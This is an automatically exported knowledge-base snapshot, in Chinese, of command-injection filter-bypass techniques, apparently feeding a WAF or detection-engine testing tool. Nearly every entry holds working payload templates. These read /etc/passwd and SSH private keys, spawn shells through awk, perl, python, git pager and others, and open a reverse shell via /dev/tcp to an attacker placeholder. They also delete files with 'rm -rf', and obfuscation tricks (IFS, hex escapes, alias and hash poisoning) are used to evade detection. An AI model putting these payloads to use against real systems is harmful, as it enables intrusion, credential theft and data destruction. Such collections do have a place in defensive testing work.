# 知识库手法全量快照

> 本文件由 `backend/scripts/export_knowledge_base.py` 从本地知识库自动生成。
> 请勿手工编辑；更新知识库后重新运行导出脚本。

- 手法总数：392
- 漏洞分布：命令注入 97、文件上传 52、Log4j 34、SQL 注入 111、XSS 98
- 状态分布：frontier 323、promoted 5、seed 64
- 来源分布：generated 328、system 64

## 命令注入（97 条）

### `cmdi:alias:expand_aliases` — shopt expand_aliases 展开别名藏命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：别名定义时命令名 cat 只出现在 alias 定义的 RHS(非待执行行)，且非交互 shell 默认不展开别名，需 `shopt -s expand_aliases` 开启——检测若只看执行行首词则为 x，骗过命令名检测。
- **模板**：`shopt -s expand_aliases\nalias x='cat /etc/passwd'\nx`（别名定义行需先于调用行解析）
- **来源备注**：`shopt -s expand_aliases\nalias x='cat /etc/passwd'\nx`（别名定义行需先于调用行解析）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:argv0:exec_a_spoof` — exec -a 伪造 argv[0] 伪装命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`exec -a` 把 name 作为第 0 个参数传给命令，ps 中进程显示为无害名(如 ls)，骗过基于进程名/首词命令名/行为日志的检测。
- **模板**：`exec -a ls /bin/cat /etc/passwd`、`exec -a whoami /bin/sh -c 'id'`
- **来源备注**：`exec -a ls /bin/cat /etc/passwd`、`exec -a whoami /bin/sh -c 'id'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:carrier:awk_system` — awk 作为命令执行载体

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用白名单内/常见的 awk 解释器执行 system()，命令名 `cat` 等目标命令不出现在进程首词位置，绕过"首词白名单/命令名黑名单"检测。
- **模板**：`awk 'BEGIN{system("cat /etc/passwd")}'`、`awk 'BEGIN{system("/bin/sh")}'`
- **来源备注**：`awk 'BEGIN{system("cat /etc/passwd")}'`、`awk 'BEGIN{system("/bin/sh")}'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:env_wrapper` — env/nice/timeout 包装执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：目标命令交给 env/nice/timeout/setarch/unshare 等包装器代为 exec，命令名出现在参数位，绕过按"首词命令名"分类的检测。
- **模板**：`env bash -c 'cat /etc/passwd'`、`timeout 5 bash -c 'cat /etc/passwd'`、`nice cat /etc/passwd`
- **来源备注**：`env bash -c 'cat /etc/passwd'`、`timeout 5 bash -c 'cat /etc/passwd'`、`nice cat /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:find_exec_cat` — find -exec 读文件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：find 遍历文件系统并 `-exec` 指定命令，被执行的 cat 出现在 `-exec` 参数位而非首词位，绕过"首词=命令名"的检测模型。
- **模板**：`find / -name 'flag*' -exec cat {} \;`、`find / -exec /bin/sh \; -quit`
- **来源备注**：`find / -name 'flag*' -exec cat {} \;`、`find / -exec /bin/sh \; -quit`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:git_pager` — git 触发 pager 执行任意命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：core.pager 配置值或 GIT_PAGER 环境变量被 git 当作 shell 命令执行，命令名完全由 git 充当，payload 中无需出现目标命令名，骗过"白名单命令"过滤。CVE-2023-29007 用 core.pager 注入实现 RCE。
- **模板**：`git -c core.pager='cat /etc/passwd' -p show`、`GIT_PAGER='/bin/sh -c "exec sh 0<&1"' git -p help`
- **来源备注**：`git -c core.pager='cat /etc/passwd' -p show`、`GIT_PAGER='/bin/sh -c "exec sh 0<&1"' git -p help`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:perl_exec` — perl 作为命令执行载体

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`perl -e` 单行代码直接执行反引号/系统调用，可对"命令名黑名单"隐形——原始 payload 只含 perl，cat 等藏在反引号内。
- **模板**：`perl -e 'print `cat /etc/passwd`'`、`perl -e 'exec "/bin/sh"'`
- **来源备注**：`perl -e 'print `cat /etc/passwd`'`、`perl -e 'exec "/bin/sh"'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:php_python_ruby` — php/python/ruby 单行解释器执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 `php -r`/`python -c`/`ruby -e` 直接调用 exec/system，payload 首词是解释器名而非目标命令，目标命令字符串可被拆分/编码以规避整行黑名单。
- **模板**：`php -r '$r=array(); exec("cat /etc/passwd", $r); print(join("\n",$r));'`、`python -c 'import os; os.execl("/bin/sh","sh")'`、`ruby -e 'exec "/bin/sh"'`
- **来源备注**：`php -r '$r=array(); exec("cat /etc/passwd", $r); print(join("\n",$r));'`、`python -c 'import os; os.execl("/bin/sh","sh")'`、`ruby -e 'exec "/bin/sh"'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:sed_e_flag` — sed s///e 内容替换执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sed 的 `e` 修饰符把替换后文本当命令执行，读文件动作与执行动作合一，命令名 cat 不出现，骗过"只拦 cat/whoami 等已知命令名"的检测。
- **模板**：`sed -n '1e cat /etc/passwd' /etc/hosts`、`sed -e 's@.*@cat /etc/passwd@e' /etc/passwd`
- **来源备注**：`sed -n '1e cat /etc/passwd' /etc/hosts`、`sed -e 's@.*@cat /etc/passwd@e' /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:carrier:xargs_feed` — xargs 管道投喂命令执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：命令名 cat 由 echo 管道传入成为 xargs 参数，首词只有 echo/xargs，骗过"首词白名单"式意图分类；读文件靠 xargs 代执行。
- **模板**：`echo /etc/passwd | xargs cat`、`echo cat | xargs /bin/bash -c`
- **来源备注**：`echo /etc/passwd | xargs cat`、`echo cat | xargs /bin/bash -c`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:dialect:fish_paren_subst` — fish (cmd) 单括号命令替换

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：fish 用 `(cmd)` 而非 `$(cmd)`/反引号做命令替换（3.4+ 亦支持 `$(cmd)`）。按 bash 建模的语义引擎会把 `(id)` 当语法错误或普通括号忽略，实际 fish 会执行并替换输出。
- **模板**：`echo (id)`、`(id)`
- **来源备注**：`echo (id)`、`(id)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `cmdi:dialect:zsh_equals_expand` — zsh =cmd 等号路径展开直指绝对路径

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：zsh 的 `=` 展开（EQUALS 选项，默认开）把 `=cmd` 展开为命令的绝对路径。`=sh -c 'id'` 字面不含可执行名 sh，而是运行时解析成 /bin/sh。语义引擎按 bash 建模不识别 `=` 展开，把它当普通词或报错，漏掉方言特有的路径展开执行。
- **模板**：`=sh -c 'id'`、`echo =cat`
- **来源备注**：`=sh -c 'id'`、`echo =cat`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `cmdi:dialect:zsh_glob_qualifier` — zsh glob 限定符 e/N 内联求值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：zsh 通配符限定符 `e:...:` 会在文件匹配时对字符串求值，`N` 令无匹配时为空不报错。语义引擎按 bash glob 建模不识别限定符里的求值，把 `*(e:...:)` 当普通通配，漏掉藏在 glob 限定符里的命令求值。
- **模板**：`echo /tmp/*(N)`、`print -l *(e:'reply=(${(f)$(id)}):')`
- **来源备注**：`echo /tmp/*(N)`、`print -l *(e:'reply=(${(f)$(id)}):')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `cmdi:fd:dev_tcp_bidir` — /dev/tcp 双向 fd 与 3<> 读写重定向组合

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：bash 把 /dev/tcp/host/port 当 socket 重定向目标拦截（connect），且重定向方向无关，`3<>` 打开一个既读又写的双向描述符。语义引擎把重定向建模为文件/描述符操作，不模拟"伪路径→socket connect"，也不理解单个 fd 同时收发，从而漏判无 nc/curl 的网络外联或反弹。
- **模板**：`exec 3<>/dev/tcp/ATTACKER/PORT; sh <&3 >&3 2>&3`、`exec 3<>/dev/tcp/HOST/PORT; printf 'GET / HTTP/1.0\r\n\r\n' >&3; cat <&3`
- **来源备注**：`exec 3<>/dev/tcp/ATTACKER/PORT; sh <&3 >&3 2>&3`、`exec 3<>/dev/tcp/HOST/PORT; printf 'GET / HTTP/1.0\r\n\r\n' >&3; cat <&3`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:44:37.878214+00:00；retired=-

### `cmdi:hash:bash_cmds_poison` — BASH_CMDS 命令哈希表投毒劫持命令解析

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：bash 用哈希表缓存 PATH 查找到的命令绝对路径，BASH_CMDS 关联数组与 `hash -p` 可改写这一映射，把无害命令名指向攻击者二进制或其它 shell。语义引擎按静态命令抽取建模，只见字面命令名与赋值，不模拟"命令名→路径"的运行时哈希解析，因而漏判后续真正执行体。
- **模板**：`hash -p /bin/bash x; x -c 'id'`、`BASH_CMDS[x]=/bin/bash; x -c 'id'`
- **来源备注**：`hash -p /bin/bash x; x -c 'id'`、`BASH_CMDS[x]=/bin/bash; x -c 'id'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `cmdi:history:bang_bang_expand` — 历史展开 !! !$ 复用前次命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：交互式 bash 在拆词/解析之前先做历史展开，`!!`、`!$`、`!?string?` 会把上一条命令或其参数原地插入。非交互的语义引擎（及普通脚本）看不到展开结果，也无法模拟 HISTFILE/历史列表，因此对通过历史展开拼出的命令抽取失败。
- **模板**：`id`、`!!`、`sudo !!`、`cd !$`
- **来源备注**：`id`、`!!`、`sudo !!`、`cd !$`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:44:37.853414+00:00；retired=-

### `cmdi:indirect:bang_var` — ${!var} 间接展开取命令名再执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：命令名拆分成变量存储，`${!var}` 做两层间接取值(变量名指向变量名)，展开结果被 shell 重新分词当作命令执行——检测若只匹配字面 'cat' 白名单或首词黑名单会漏过(字面 cat 不出现在执行语境)。
- **模板**：`b=cat; a=b; ${!a} /etc/passwd`、`c=/etc/passwd; x=c; ${!a} ${!x}`
- **来源备注**：`b=cat; a=b; ${!a} /etc/passwd`、`c=/etc/passwd; x=c; ${!a} ${!x}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:44:37.790095+00:00；retired=-

### `cmdi:lexical:ansi_c_quoting` — ANSI-C 引号

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`$'\x63\x61\x74'` 产生 `cat`；整个命令可写成十六进制转义序列，WAF 看不到明文命令名。
- **模板**：`$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
- **来源备注**：`$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:backslash` — 反斜杠

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell 反斜杠转义，`\c\a\t` → `cat`。
- **模板**：`\c\a\t /etc/passwd`、`c\at /e\tc/passwd`
- **来源备注**：`\c\a\t /etc/passwd`、`c\at /e\tc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:backslash_newline` — 反斜杠+换行续行拆分命令 token

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：bash 中反斜杠后紧跟换行是续行，词法层面跨行拼接；单行上 `c\<newline>at` 这类 token 被拆到两行，WAF 的按行/单 token 匹配器永远看不到 c、a、t 连续出现，后端却拼成 cat；`rm -rf \<newline> /` 还可替代空格。这是"解析器拼接时机"与"WAF 按行建模"的差异（orchestkit 2024 专门修复该类绕过）。
- **模板**：`c\%0aat /etc/passwd`、`w\%0aho\%0aam\%0ai`、`rm -rf \%0a /`
- **来源备注**：`c\%0aat /etc/passwd`、`w\%0aho\%0aam\%0ai`、`rm -rf \%0a /`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:default_value_split` — ${x:-c} 默认值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：${x:-c} 默认值展开逐字符拼命令名，命令字面量不出现，绕关键字黑名单。
- **模板**：`${x:-c}${x:-a}${x:-t} /etc/passwd`、`c${x:-a}t /etc/passwd`（POSIX）`
- **来源备注**：`${x:-c}${x:-a}${x:-t} /etc/passwd`、`c${x:-a}t /etc/passwd`（POSIX）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:empty_cmd_subst` — 空命令替换

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：$() 与反引号空命令替换插入命令中间（wh$()oami、c``at），拆散命令名连续串。
- **模板**：`wh$()oami`、`c``at /etc/passwd`（POSIX）`
- **来源备注**：`wh$()oami`、`c``at /etc/passwd`（POSIX）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:empty_special_param` — $@/$* 空参数拆分

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：$@/$* 空参数在双引号外展开为空，插入命令名拆分 token（c$@at）。
- **模板**：`c$@at /etc/passwd`、`who$@ami`、`l$@s -la`
- **来源备注**：`c$@at /etc/passwd`、`who$@ami`、`l$@s -la`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:ifs` — IFS 变量

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${IFS}` 作为空白，`cat${IFS}/etc/passwd`，绕"命令+空格+路径"特征。
- **模板**：`cat${IFS}/etc/passwd`、`;ls${IFS}-la${IFS}/`
- **来源备注**：`cat${IFS}/etc/passwd`、`;ls${IFS}-la${IFS}/`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:ifs_space_bypass` — $IFS 空格绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：利用 Shell 内部字段分隔符变量 $IFS（默认包含空格、制表符、换行）替代命令中的空格，并拼接空参数 $9 或 ${IFS} 等方式避免变量名与后续字符粘连，从而在命令语法不变的情况下绕过基于空格分隔的过滤规则。
- **模板**：;cmd$IFS$9arg1$IFS$9arg2、;getent$IFS$9hosts$IFS$9<attacker-host>;echo$IFS$9$((3482*7301));
- **来源备注**：原理：利用 Shell 内部字段分隔符变量 $IFS（默认包含空格、制表符、换行）替代命令中的空格，并拼接空参数 $9 或 ${IFS} 等方式避免变量名与后续字符粘连，从而在命令语法不变的情况下绕过基于空格分隔的过滤规则。 模板：;cmd$IFS$9arg1$IFS$9arg2、;getent$IFS$9hosts$IFS$9<attacker-host>;echo$IFS$9$((3482*7301));
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T09:37:25.090594+00:00；updated=2026-08-23T09:37:25.090594+00:00；retired=-

### `cmdi:lexical:ifs_variants` — IFS 变体

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：$IFS$9、${IFS%??} 等 IFS 变体绕过只匹配 ${IFS} 字面量的检测。
- **模板**：`cat$IFS$9/etc/passwd`、`ls${IFS%??}-la`、`cat$'\t'/etc/passwd`
- **来源备注**：`cat$IFS$9/etc/passwd`、`ls${IFS%??}-la`、`cat$'\t'/etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:octal_ansi` — ANSI-C 八进制

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：$'\143\141\164' ANSI-C 八进制转义拼命令，命令名不出现字面量。
- **模板**：`$'\143\141\164' /etc/passwd`、`cat$'\40'/etc/passwd`（bash-only）`
- **来源备注**：`$'\143\141\164' /etc/passwd`、`cat$'\40'/etc/passwd`（bash-only）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:printf_hex` — printf 内建 \x/八进制转义解码命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`$(printf '\x63\x61\x74 ...')` 用 printf 内建在命令替换里把十六进制/八进制转义解码成命令再执行，不依赖 bash 的 ANSI-C `$'..'` 语法，在 sh/dash/busybox 上也可成立（八进制 `\ooo` 为 POSIX）；WAF 若只对 `$'..'`、base64、rev 等建模会漏过 printf 路径；printf 输出中的空格需引号包裹保留。
- **模板**：`$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67')`、`$(printf '\154\163')`
- **来源备注**：`$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67')`、`$(printf '\154\163')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:quote_split` — 引号拆分

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell 移除引号，`c'a't` → `cat`；WAF 的 `cat` 字符串匹配被打断。**已在本地 lab 实测 11/11 全过。**
- **模板**：`c'a't /e'tc'/pa'sswd`、`ca't' /etc/passwd`
- **来源备注**：`c'a't /e'tc'/pa'sswd`、`ca't' /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:redir_space` — 重定向替代空格

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：cat</etc/passwd 用输入重定向替代命令与参数间的空格。
- **模板**：`cat</etc/passwd`、`cat<>/etc/passwd`、`sh</dev/tcp/127.0.0.1/4242`（POSIX）`
- **来源备注**：`cat</etc/passwd`、`cat<>/etc/passwd`、`sh</dev/tcp/127.0.0.1/4242`（POSIX）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:special_param_chars` — $-/$#/$SHLVL 特殊参数作字符源拼命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在关键字与字符双重过滤的受限环境里，用 `$-`（选项串 himBH）、`$#`、`$SHLVL`、`$_` 的取值作字符源，配合 `${var:offset:length}` 子串逐字符重组被禁命令（`${-::$SHLVL}`→h、`${-:$SHLVL:$SHLVL}`→i、`${_:$#:$SHLVL}`→e），再用 `${PWD::$SHLVL}` 取 '/'。命令字面量与斜杠均不出现，绕过命令词抽取和危险字符黑名单（Securinets CTF 实证）。
- **模板**：`cat ${PWD::$SHLVL}etc${PWD::$SHLVL}passwd`、`${-::$SHLVL}`→h、`${-:$SHLVL:$SHLVL}`→i、`${_:$#:$SHLVL}`→e 作字符源
- **来源备注**：`cat ${PWD::$SHLVL}etc${PWD::$SHLVL}passwd`、`${-::$SHLVL}`→h、`${-:$SHLVL:$SHLVL}`→i、`${_:$#:$SHLVL}`→e 作字符源
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:tilde_home` — ~ 波浪号展开绕过 $HOME/变量过滤

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`~` 是 shell 词首展开的独立机制，发生在参数展开之前，且即使 `$HOME` 被删除/过滤，bash 仍通过 getpwuid 回退系统 passwd 库解析出主目录；`~root/` 可直接引用任意用户主目录而完全不出现 `$` 或环境变量名。滤 `$HOME`、`$` 或环境变量引用的检测会漏过 `~` 形式（hermes-agent / trufflehog 真实注入漏洞实证）。
- **模板**：`cat ~/.ssh/id_rsa`、`cat ~root/.bash_history`、`echo ~root/$(id)`
- **来源备注**：`cat ~/.ssh/id_rsa`、`cat ~root/.bash_history`、`echo ~root/$(id)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:tr_shift` — tr 字符范围平移产生被禁字符

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：利用 tr 的字符范围映射把合法字符沿 ASCII 平移成被禁字符：`$(tr '!-}' '\"-~'<<<[)` 把 `[` 平移得到 `\`，同理可产出 /、;、空格等；被禁字符从不以字面量出现，绕过单字符黑名单（field-manual 实测）。
- **模板**：`$(tr '!-}' '\"-~'<<<[)`（产生反斜杠）
- **来源备注**：`$(tr '!-}' '\"-~'<<<[)`（产生反斜杠）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:lexical:underscore_lastarg` — $_ 上一命令末参数拼接命令名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：bash 特殊参数 `$_` 展开为上一同步命令的最后一个参数（展开后值），可被拼入命令名：先 echo 一个单词再拼 `$_` 得到完整命令，whoami/cat 等关键字不以整体出现，绕过抽取命令名的正则与关键字黑名单；语义引擎若不做多命令状态跟踪则失效。
- **模板**：`echo ami;who$_`、`echo /etc/passwd;cat $_`
- **来源备注**：`echo ami;who$_`、`echo /etc/passwd;cat $_`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:param:param_transform_qe` — ${var@Q} / ${var@E} 参数转换引用与转义展开

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${var@Q}` 把值重写成可复用的 shell 引用形式，`${var@E}` 按 `$'...'` 规则展开反斜杠转义（含 `\xHH`）。二者是 bash 4.4+ 的参数转换运算符，可与 eval 组合完成解码→重新求值。语义引擎若只按常规 `${var...}` 展开建模，会漏掉 @Q/@E 这一层转换与二次求值链路。
- **模板**：`v='\x69\x64'; eval "${v@E}"`、`v='id'; eval "${v@Q}"`
- **来源备注**：`v='\x69\x64'; eval "${v@E}"`、`v='id'; eval "${v@Q}"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:44:39.560969+00:00；retired=-

### `cmdi:param:prefix_name_expand` — ${!prefix*} 前缀名枚举 + 间接展开多跳

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${!prefix*}` 枚举以 prefix 开头的变量名，配合间接展开 `${!name}` 可形成"先列名→再取值→再求值"的多跳链路，命令名在静态源码中不直接出现。语义引擎难以追踪前缀枚举与间接展开的多步跳转，抽取不到最终命令。
- **模板**：`PAYLOAD='id'; eval "\${${!PAY*}}"`、`env 'BASH_FUNC_x%%=() { id; }'; echo ${!BASH_FUNC*}`
- **来源备注**：`PAYLOAD='id'; eval "\${${!PAY*}}"`、`env 'BASH_FUNC_x%%=() { id; }'; echo ${!BASH_FUNC*}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:44:39.504963+00:00；retired=-

